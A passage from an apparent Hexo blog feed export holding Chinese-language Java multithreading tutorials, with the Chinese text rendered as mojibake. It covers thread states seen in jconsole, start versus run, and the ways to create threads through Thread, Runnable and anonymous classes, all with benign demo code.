&#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (object) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;hehe&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>);</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240816204151561.png" alt="image-20240816204151561"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240816204208543.png" alt="image-20240816204208543"></p><p>ä½¿ç”¨jconsoleè§‚å¯Ÿï¼Œt1çº¿ç¨‹ä¸ºTIMED_WAITINGçŠ¶æ€ï¼ˆæ’é˜Ÿç­‰å·¥ä½œ sleepå¼•èµ·ï¼‰ï¼Œt2çº¿ç¨‹ä¸ºBLOCKEDçŠ¶æ€ï¼ˆç”±äºt1æœªæ‰§è¡Œå®Œ äº§ç”Ÿé”ç«äº‰ï¼‰</p><p>ä¿®æ”¹sleepä¸ºwaitå t2çº¿ç¨‹ç»“æŸ æ‰“å°å‡ºâ€œheheâ€ t1çº¿ç¨‹ä¸ºWAITINGçŠ¶æ€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadStateTransfer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (object) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            object.wait();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (object) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;hehe&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>);</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240816204737122.png" alt="image-20240816204737122"></p><h5 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h5><p>1.BLOCKED è¡¨ç¤ºç­‰å¾…è·å–é”, WAITING å’ŒTIMED_WAITING è¡¨ç¤ºç­‰å¾…å…¶ä»–çº¿ç¨‹å‘æ¥é€šçŸ¥.  2.TIMED_WAITING çº¿ç¨‹åœ¨ç­‰å¾…å”¤é†’ï¼Œä½†è®¾ç½®äº†æ—¶é™; WAITING çº¿ç¨‹åœ¨æ— é™ç­‰å¾…å”¤é†’</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¤šçº¿ç¨‹_0x1_</title>
      <link href="/2024/09/04/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B8%80/"/>
      <url>/2024/09/04/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="å¤šçº¿ç¨‹ç¯‡ä¸€"><a href="#å¤šçº¿ç¨‹ç¯‡ä¸€" class="headerlink" title="å¤šçº¿ç¨‹ç¯‡ä¸€"></a>å¤šçº¿ç¨‹ç¯‡ä¸€</h2><p><strong>å¦‚ç¬”è€…ç†è§£æœ‰è¯¯ï¼Œæ¬¢è¿äº¤æµæŒ‡æ­£â­</strong></p><h3 id="çº¿ç¨‹"><a href="#çº¿ç¨‹" class="headerlink" title="çº¿ç¨‹"></a>çº¿ç¨‹</h3><p>ä¸€ä¸ªçº¿ç¨‹å°±æ˜¯ä¸€ä¸ªâ€œæ‰§è¡Œæµâ€.<br>æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ‰§è¡Œé€»è¾‘.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªç±», ç»§æ‰¿è‡ª Thread .</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// è¿™ä¸ªæ–¹æ³•å°±æ˜¯çº¿ç¨‹çš„å…¥å£æ–¹æ³•.</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºçº¿ç¨‹.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread</span>();     </span><br><span class="line">        <span class="comment">//thread.start();  äº¤æ›¿æ‰“å°</span></span><br><span class="line">        thread.run();</span><br><span class="line">        <span class="comment">//å…¨éƒ¨æ‰“å°Welcome Thread!</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> start å’Œ run éƒ½æ˜¯ Thread çš„æˆå‘˜.<br> <strong>run åªæ˜¯æè¿°äº†çº¿ç¨‹çš„å…¥å£(çº¿ç¨‹è¦åšä»€ä¹ˆä»»åŠ¡)</strong><br> **start åˆ™æ˜¯çœŸæ­£è°ƒç”¨äº†ç³»ç»Ÿ API, åœ¨ç³»ç»Ÿä¸­åˆ›å»ºå‡ºçº¿ç¨‹, è®©çº¿ç¨‹å†è°ƒç”¨ run.**ï¼ˆå³å®ç°å¹¶å‘ã€å…µåˆ†ä¸¤è·¯ å……åˆ†åˆ©ç”¨å¤šæ ¸CPUã€‘ Javaä¸­çš„â€œå¹¶å‘â€å¤šæŒ‡å¹¶è¡Œ+å¹¶å‘ åŒºåˆ«æ“ä½œç³»ç»Ÿä¸­çš„å®è§‚å’Œå¾®è§‚ç†è§£ï¼‰</p><h5 id="ä¸ºä»€ä¹ˆéœ€è¦çº¿ç¨‹"><a href="#ä¸ºä»€ä¹ˆéœ€è¦çº¿ç¨‹" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦çº¿ç¨‹"></a>ä¸ºä»€ä¹ˆéœ€è¦çº¿ç¨‹</h5><p>å¥½å¥‡å®å®å‘é—®ğŸ¤­<br>äººå¤šåŠ›é‡å¤§ï¼å•æ ¸CPUèƒ½åŠ›æœ‰é™ï¼Œå¤šæ ¸CPUå¯ä»¥æé«˜ç®—åŠ›ï¼Œ<strong>å¹¶å‘</strong>ç¼–ç¨‹èƒ½å……åˆ†åˆ©ç”¨å¤šæ ¸CPUçš„èµ„æº.<br>æˆ‘ä»¬æ˜¯æœ‰ç¤¼è²Œçš„å­©å­ï¼â€œIOç­‰å¾…â€åœ¨æœ‰äº›åœºæ™¯æ— æ³•é¿å…ï¼Œå¦‚ä½•åˆ©ç”¨ç­‰å¾…çš„æ—¶é—´åšå…¶ä»–å·¥ä½œï¼Ÿå½“ç„¶å°‘ä¸äº†å¹¶å‘ç¼–ç¨‹.<br><strong>tips</strong><br>å¤šè¿›ç¨‹ä¹Ÿèƒ½å®ç°å¹¶å‘ï¼Œä½†çº¿ç¨‹é‡çº§æ›´è½».<br>1.åˆ›å»ºçº¿ç¨‹æ¯”åˆ›å»ºè¿›ç¨‹æ›´å¿«.<br>2.é”€æ¯çº¿ç¨‹æ¯”é”€æ¯è¿›ç¨‹æ›´å¿«.<br>3.è°ƒåº¦çº¿ç¨‹æ¯”è°ƒåº¦è¿›ç¨‹æ›´å¿«.</p><h3 id="å¤šçº¿ç¨‹"><a href="#å¤šçº¿ç¨‹" class="headerlink" title="å¤šçº¿ç¨‹"></a>å¤šçº¿ç¨‹</h3><p>å½“è¿›è¡Œå¤æ‚ä»»åŠ¡æ—¶ï¼Œä¼šåˆ›å»ºå¤šä¸ªçº¿ç¨‹è¿›è¡Œé—®é¢˜å¤„ç†ï¼Œä¸åŒçº¿ç¨‹æœ‰ä¸åŒçš„å°ä»»åŠ¡æ’é˜Ÿæ‰§è¡Œ.<br><strong>æ“ä½œç³»ç»Ÿä¸­è¿è¡Œçš„ä»»ä½•ç¨‹åºéƒ½è‡³å°‘æœ‰ä¸€ä¸ªä¸»çº¿ç¨‹.</strong></p><h4 id="å¦‚ä½•ç›‘æµ‹å¤šçº¿ç¨‹è¿è¡Œæƒ…å†µ"><a href="#å¦‚ä½•ç›‘æµ‹å¤šçº¿ç¨‹è¿è¡Œæƒ…å†µ" class="headerlink" title="å¦‚ä½•ç›‘æµ‹å¤šçº¿ç¨‹è¿è¡Œæƒ…å†µ"></a>å¦‚ä½•ç›‘æµ‹å¤šçº¿ç¨‹è¿è¡Œæƒ…å†µ</h4><h5 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h5><p>debugå¯åŠ¨æœ‰ä¸€ä¸ªä¸“é—¨çš„çª—å£æŸ¥çœ‹æ–¹æ³•çš„è°ƒç”¨æ ˆï¼Œå¯ä»¥æŸ¥çœ‹æ‰€æœ‰çº¿ç¨‹çš„ä¿¡æ¯.</p><p>ä¸‹æ–­ç‚¹ï¼Œå³å‡»å¯é€‰æ‹©å…¨éƒ¨çº¿ç¨‹ï¼ˆALLï¼‰æˆ–è€…æŒ‡å®šçš„çº¿ç¨‹ï¼ˆThreadï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812112804515.png" alt="image-20240812112804515"></p><p>debug<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812113418013.png" alt="image-20240812113418013"></p><h5 id="Jconsole"><a href="#Jconsole" class="headerlink" title="Jconsole"></a>Jconsole</h5><p><strong>æ–°æ‰‹æ¨è</strong></p><p>å¯åŠ¨å‰ç¡®ä¿ç¨‹åºè·‘èµ·æ¥<br>Jconsoleæ˜¯JDKä¸­è‡ªå¸¦çš„å·¥å…·<br>Ctrl+Alt+shift+sæ‰“å¼€project structure æŸ¥çœ‹jdkè·¯å¾„<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812113858448.png" alt="image-20240812113858448"></p><p>å¦‚æœåŒå‡»æ‰“ä¸å¼€ å¯å°è¯•ç®¡ç†å‘˜æ–¹å¼è¿è¡Œ<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812114349198.png" alt="image-20240812114349198"></p><h4 id="çº¿ç¨‹å’Œè¿›ç¨‹çš„åŒºåˆ«"><a href="#çº¿ç¨‹å’Œè¿›ç¨‹çš„åŒºåˆ«" class="headerlink" title="çº¿ç¨‹å’Œè¿›ç¨‹çš„åŒºåˆ«"></a>çº¿ç¨‹å’Œè¿›ç¨‹çš„åŒºåˆ«</h4><p>1.è¿›ç¨‹æ˜¯åŒ…å«çº¿ç¨‹çš„:æ¯ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹å­˜åœ¨ï¼Œå³ä¸»çº¿ç¨‹.<br>2.è¿›ç¨‹å’Œè¿›ç¨‹ä¹‹é—´ä¸å…±äº«å†…å­˜ç©ºé—´. åŒä¸€ä¸ªè¿›ç¨‹çš„çº¿ç¨‹ä¹‹é—´å…±äº«åŒä¸€ä¸ªå†…å­˜ç©ºé—´.<br>3.è¿›ç¨‹æ˜¯ç³»ç»Ÿåˆ†é…èµ„æºçš„æœ€å°å•ä½ï¼Œçº¿ç¨‹æ˜¯ç³»ç»Ÿè°ƒåº¦çš„æœ€å°å•ä½.</p><h4 id="Thread-sleep"><a href="#Thread-sleep" class="headerlink" title="Thread.sleep()"></a>Thread.sleep()</h4><p>çº¿ç¨‹ä¼‘çœ ï¼Œæ–¹ä¾¿è§‚å¯Ÿï¼Œsleepæ˜¯Threadçš„é™æ€æ–¹æ³•.<br>sleepæ–¹æ³•å¯èƒ½ä¼šæŠ›å‡ºå¦‚ä¸‹å¼‚å¸¸<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812115012903.png" alt="image-20240812115012903"></p><p>æ­¤å¼‚å¸¸ä¸ºå—æŸ¥å¼‚å¸¸ï¼Œå¿…é¡»æ˜¾ç¤ºå¤„ç†<br><strong>å¿…é¡»try cacth<em>ï¼Œä¸èƒ½throws</em></strong><br><u>ä¸Šè¿°ä»£ç é‡å†™çˆ¶ç±»çš„runï¼Œçˆ¶ç±»çš„runæ–¹æ³•æ²¡æœ‰throwsï¼Œå­ç±»ä¹Ÿä¸èƒ½æœ‰</u>ï¼ˆå¼€å¤´çº¿ç¨‹å¤„ä»£ç  å¯æŸ¥æºç ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812115452951.png" alt="image-20240812115452951"></p><p>sleepæ¯ç§’é’Ÿæ‰“å°å‡ºæ¥çš„é¡ºåºä¹Ÿæ˜¯ä¸ç¡®å®šçš„â€œéšæœºæ€§â€.<br>å–å†³äºæ“ä½œç³»ç»Ÿå¯¹çº¿ç¨‹çš„è°ƒåº¦æ¨¡å—ï¼Œéç­‰æ¦‚ç‡éšæœº.</p><h3 id="åˆ›å»ºçº¿ç¨‹çš„å…¶ä»–å†™æ³•ã€é¢è¯•é¢˜ã€‘"><a href="#åˆ›å»ºçº¿ç¨‹çš„å…¶ä»–å†™æ³•ã€é¢è¯•é¢˜ã€‘" class="headerlink" title="åˆ›å»ºçº¿ç¨‹çš„å…¶ä»–å†™æ³•ã€é¢è¯•é¢˜ã€‘"></a>åˆ›å»ºçº¿ç¨‹çš„å…¶ä»–å†™æ³•ã€é¢è¯•é¢˜ã€‘</h3><p>éå®Œå…¨ï¼Œåç»­è¿›è¡Œè¡¥å……~</p><h4 id="ç»§æ‰¿thread-é‡å†™runï¼ˆæ˜¾ç¤ºï¼‰"><a href="#ç»§æ‰¿thread-é‡å†™runï¼ˆæ˜¾ç¤ºï¼‰" class="headerlink" title="ç»§æ‰¿thread é‡å†™runï¼ˆæ˜¾ç¤ºï¼‰"></a>ç»§æ‰¿thread é‡å†™runï¼ˆæ˜¾ç¤ºï¼‰</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªç±», ç»§æ‰¿è‡ª Thread .</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// è¿™ä¸ªæ–¹æ³•å°±æ˜¯çº¿ç¨‹çš„å…¥å£æ–¹æ³•.</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºçº¿ç¨‹.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread</span>();     </span><br><span class="line">        <span class="comment">//thread.start();  äº¤æ›¿æ‰“å°</span></span><br><span class="line">        thread.run();</span><br><span class="line">        <span class="comment">//å…¨éƒ¨æ‰“å°Welcome Thread!</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å®ç°Runnable-é‡å†™runï¼ˆæ˜¾ç¤ºï¼‰"><a href="#å®ç°Runnable-é‡å†™runï¼ˆæ˜¾ç¤ºï¼‰" class="headerlink" title="å®ç°Runnable é‡å†™runï¼ˆæ˜¾ç¤ºï¼‰"></a>å®ç°Runnable é‡å†™runï¼ˆæ˜¾ç¤ºï¼‰</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">runnable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyRunnable</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(runnable);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯¹æ¯”ä¸Šé¢ä¸¤ç§æ–¹æ³•: <strong>ç»§æ‰¿ Thread ç±», ç›´æ¥ä½¿ç”¨ this å°±è¡¨ç¤ºå½“å‰çº¿ç¨‹å¯¹è±¡çš„å¼•ç”¨.  å®ç° Runnable æ¥å£, this è¡¨ç¤ºçš„æ˜¯ MyRunnable çš„å¼•ç”¨. éœ€è¦ä½¿ç”¨ Thread.currentThread()</strong></p><h4 id="ç»§æ‰¿Thread-é‡å†™run-ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»"><a href="#ç»§æ‰¿Thread-é‡å†™run-ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»" class="headerlink" title="ç»§æ‰¿Thread é‡å†™run ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»"></a>ç»§æ‰¿Thread é‡å†™run ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        thread.start();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="å®ç°Runnable-é‡å†™run-ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»"><a href="#å®ç°Runnable-é‡å†™run-ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»" class="headerlink" title="å®ç°Runnable é‡å†™run ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»"></a>å®ç°Runnable é‡å†™run ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> 